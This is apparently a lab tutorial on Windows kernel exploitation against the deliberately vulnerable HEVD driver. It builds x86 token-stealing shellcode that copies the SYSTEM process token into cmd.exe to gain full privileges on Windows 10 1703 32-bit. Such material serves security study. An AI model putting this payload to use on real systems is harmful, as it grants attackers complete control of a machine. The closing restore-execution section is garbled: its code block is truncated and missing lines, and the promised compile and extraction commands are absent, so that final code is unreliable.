= HEVD: Local Privilege Escalation

This is the fourth article on where we've been through Windows Kernel
exploitation, using
link:https://github.com/hacksysteam/HackSysExtremeVulnerableDriver[HackSys Extremely Vulnerable Driver]
or `HEVD` as the target. In the previous articles, we've covered:

* link:../windows-kernel-debugging/[Lab setup], describing the tools and
environment needed to do Windows Kernel debugging.
* link:../hevd-dos/[Denial of Service] in which we performed an initial
attack to `HEVD`.
* link:../hevd-smep-bypass/[kASLR SMEP] were also successfully bypassed and
we could execute a simple shellcode in kernel mode.

In this article we will be able to obtain a privileged `SYSTEM` shell,
performing a Local Privilege Escalation by stealing security tokens.
We will also need to successfully resume execution of our OS after
the attack, to avoid any crash.

== Security token stealing

When we are attacking the kernel, we are supposed to have unprivileged access
to the target machine. That's why the common exploit goal is to perform
Local Privilege Escalation which means to get full privileges on the
OS. There are
link:https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/[several methods]
that can be used to do that. Most of them (ab)use the privilege model
implemented by Windows.

In Windows, when the system starts, a process called `System` is created,
always with `PID` 4. As this process is owned by the `SYSTEM` user, we will
use this as the target process to steal the ticket from.

image::sysprocess2.png[SYSTEM processes]

Each process has a `EPROCESS` structure.

image::eprocess1.png[EPROCESS structure]

One of the members of that structure is `Token` which is a ticket granted
by the `LSASS` process.

image::token1.png[Security Token]

The token is used to perform operations on the system
based on the permissions granted to it. For example, if a process
wants to read a file, that file security descriptor will check if the
token of process has the permissions to do it. This is what is known as
Discretionary Access Control List or `DACL`.

In Windows, the `SYSTEM` token has all the permissions granted on all the
system objects (files, processes, devices, pipes, etc). That's why, if
we are able to steal that token and insert it to a non-privileged process,
that process will gain `SYSTEM` privileges.

To do that, we first need to get the offset of the `Token` field in the
`EPROCESS` structure:

image::token2.png[Security Token]

As you see, it is at `_EPROCESS+0x0fc`. With that, we need to get the `SYSTEM`
process descriptor:

image::sysprocess1.png[SYSTEM process]

Then, we need to get the value of the token for the `SYSTEM` process:

image::tokenvalue1.png[SYSTEM token value]

Now, we launch a `cmd.exe` process on the target OS and get the current
privileges:

image::before1.png[Before Privilege Escalation]

We must get the `cmd.exe` process descriptor:

image::cmdprocess1.png[CMD process]

Finally, we must copy the value of the token of the `SYSTEM` process to
the `cmd.exe` process. Let's see it in action:

image::lpe1.gif[Local Privilege Escalation]

Wonderful! As you can see, our `cmd.exe` is now running as
`nt authority\system`!

*NOTE:* We need to remember that the offsets described in this article
are only applicable for the Windows version that we are currently using:
Windows 10 1703 32 bits.

Now, we must make this process programmatically if we want to include
it in our exploit. The strategy is the following:

* Look for a fixed starting point that we can use to calculate offsets, using
position-independent code.
* Get the current process list.
* Find the `cmd.exe` process.
* Find the `SYSTEM` process (with `PID` 4).
* Grab the `Token` from the `SYSTEM` process.
* Copy the token from process `SYSTEM` to the `cmd.exe` process.
* Restore execution.
* Enjoy.

The first step is to find a fixed position from where we can get the required
structures as an offset. According to
link:https://en.wikipedia.org/wiki/Win32_Thread_Information_Block[this entry],
we can access the `_NT_TIB` structure from the `fs` segment selector. This
structure holds information of the current running thread (in our case, that
would be the exploit). The article also says that we can reach the `_KTHREAD`
structure at `fs+0x124`. With that, we can start writing some assembler:

[source,x86asm]
----
pushad                                  ; Save current registers
mov eax, dword fs:[0x124]               ; EAX now points to _KTHREAD
----

In the `_KTHREAD` structure we can find an offset to the `_KPROCESS`.

image::kthread1.png[KTHREAD KPROCESS]

It turns out that `_KPROCESS` is the first field of `_EPROCESS`, which means
that we can access the `_EPROCESS` structure at `_KTHREAD+0x150`:

[source,x86asm]
----
pushad                                  ; Save current registers
mov eax, dword fs:[0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
----

The `_EPROCESS` structure holds the required offsets to the other needed
information:

* `_EPROCESS+0x0b8` points to `ActiveProcessLinks` which is a linked list
holding the current running processes, and `_EPROCESS+0x0b4` points to the
current process `PID`:

image::activeprocess1.png[Active Process Links]

* `_EPROCESS+0x140` points to `InheritedFromUniqueProcessId` which will contain
the `PID` of the parent process, in our case the `PID` of `cmd.exe`:

image::parentpid1.png[Parent Pid]

With that, we need to save the `PID` of `cmd.exe`:

[source,x86asm]
----
pushad                                  ; Save current registers
mov eax, dword fs:[0x124]               ; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]              ; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]          	; EDX now points to cmd.exe PID
----

Now we need to traverse the `ActiveProcessLinks` list to find the `_EPROCESS`
structure for the `cmd.exe` process:

[source,x86asm]
----
pushad                                  ; Save current registers
mov eax, dword [fs:0x124]           	; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]          	; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]          	; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
----

Then, find the `_EPROCESS` structure for the `SYSTEM` process:

[source,x86asm]
----
pushad                                  ; Save current registers
mov eax, dword [fs:0x124]           	; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]          	; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]          	; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
find_system:
mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], 4            	; Check if this entry belongs to PID 4 = SYSTEM
jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
----

We then must move the token from `SYSTEM` to `cmd.exe`:

[source,x86asm]
----
pushad                                  ; Save current registers
mov eax, dword [fs:0x124]           	; EAX now points to _KTHREAD
mov eax, dword [eax+0x150]          	; EAX now points to _EPROCESS
mov edx, dword [eax+0x140]          	; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
find_system:
mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                        ; of current process
sub ecx, 0x0b8                          ; Point to current _EPROCESS
cmp dword [ecx+0x0b4], 4                ; Check if this entry belongs to PID 4 = SYSTEM
jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
add ecx, 0x0fc                          ; ECX now points to the Token of SYSTEM
mov ecx, [ecx]                          ; Copy contents of Token to ECX
mov [edi+0x0fc], ecx                    ; Move the Token of SYSTEM to cmd.exe
----

And finally restore execution. As we are writing in the stack, we had surely
mangled immediate stack frames of caller functions. If we look at the stack
after executing the shellcode, we can see that there is a stack frame at which
we can return to, located at `esp+0x10`:

image::prev-ebp1.png[Previous unmangled stack frame]

With that, we can add a restore point to our shellcode:

[source,x86asm]

mov eax, dword [fs:0x124]           	; EAX now points to _KTHREAD

mov edx, dword [eax+0x140]          	; EDX now points to cmd.exe PID
mov ecx, eax                            ; ECX will be used to iterate over ActiveProcessLinks
find_cmd:
mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                        ; of current process

Now, we can compile that code with:

And get the shellcode with:

Glorious! We were able to steal the token of the `SYSTEM` process and
copy it to our `cmd.exe` shell. Now, we own the system!

== Conclusions

It was fun to steal the `SYSTEM` process token and pass it to our own
parent process. There are many other ways of gaining Local Privilege Escalation
but this method is one of the most used because it is extremely reliable if
you can restore the execution of the kernel.
